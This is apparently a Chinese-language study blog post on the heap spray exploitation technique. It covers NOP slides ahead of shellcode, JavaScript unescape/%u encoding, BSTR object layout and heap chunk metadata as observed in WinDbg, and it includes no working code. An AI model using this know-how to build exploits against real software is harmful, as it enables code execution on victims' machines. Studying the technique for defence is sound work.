heap spray技术学习

发表于 2021-05-24 更新于 2021-05-26

概念

Heap Spray并不是用于实现堆漏洞利用的，Heap Spray只是一种payload传递技术，以帮助你将payload放置在可预测的内存地址，以便于你跳转或返回到payload地址。
广义上讲，如果在控制EIP前，你能够在可预测的地址上分配内存，那么这就是在使用Heap Spray技术。
实现Heap Spray分三步

  1. 喷射堆块
  2. 触发漏洞
  3. 控制EIP指向堆中

Heap Spray原理和内存布局

喷射数据块由两部分组成

  1. slide code （常见的就是NOP指令，还有一些类NOP指令，比如0x0C，0x0D,特点是不影响shellcode执行）
  2. shellcode

为什么要在shellcode前加slide code？
成功执行shellcode的前提是从第一行开始顺序执行代码，如果内存空间充满shellcode，那么准确跳转到shellcode第一行的概率几乎为0。而在shellcode前加一段相对shellcode大很多的slide code，那么跳转时大概率会落在slidecode，进而最终执行shellcode。

基础脚本框架

堆喷射是一种payload传递技术, 它充分利用了javascript的特性.
在编写脚本之前，需要了解，javascript中的字符串是unicode编码的，那么我们需要解决unicode的传输问题，可直接使用javascript中的unescape() 函数实现。这个函数是用于“解码编码字符串”。因此如果用一些已经是unicode的字符串赋予变量，那么它就不用再转换成unicode了，这个组合%u即可实现，一个%u占2字节，放置在里面的字节都必须反序排列

BSTR字符串对象

实际当分配一个字符串后，它会变成BSTR字符串对象，该对象有一个头信息和终止符，并包含原始字符串经unicode转换后的字符串。BSTR对象的头信息有4字节(dword)，包含有unicode string的长度。在对象尾部包含有两个null字节，代表字符串的结束。
这里先介绍概念，后面会讲到BTSR与堆块的关系

我们已经能如愿的分配内存了，那么现在尝试分配连续的nop+shellcode

在windbg中观察喷射区域，可以发现，较低地址的有许多缝隙，而接着往下较高地址就基本是连续的了，这也验证之前说的，跳转地址在高地址的exp更稳定。

这里观察内存还有一个问题，我发现每个块的大小在0x2000字节。而预期是0x1000
原因是这里有关字符串的操作函数，都是以unicode编码来算的，即length函数返回的值是字节数除以2，substring函数同理。

更进一步

为了达到堆喷的目标，还要分配更多的数据填充更多的堆空间(覆写更高的内存地址)，已经改变块大小以适应BSTR对象, 是分配更稳定和连续。

先看看BSTR对象与堆块的关系**

为避免间隙过大导致内存过多垃圾数据，必须正确地选取BSTR对象大小，以便于正确地分配堆块大小，使其尽可能地与BSTR对象大小相同。
回头观察刚才的脚本分配的堆块与BSTR对象大小

其次是堆块头的大小问题，一般来讲每个堆块除了用户可访问部分之外还有一个前置元数据和后置元数据部分。前置元数据里面8字节堆块描述信息（包含块大小，堆段索引，标志等等信息）是肯定有的，前置数据里面可能还有一些字节的填充数据用于检测堆溢出，后置元数据里面主要是后置字节数和填充区域以及堆额外数据，这些额外数据（指非用户可以访问部分）加起来的大小在32字节左右
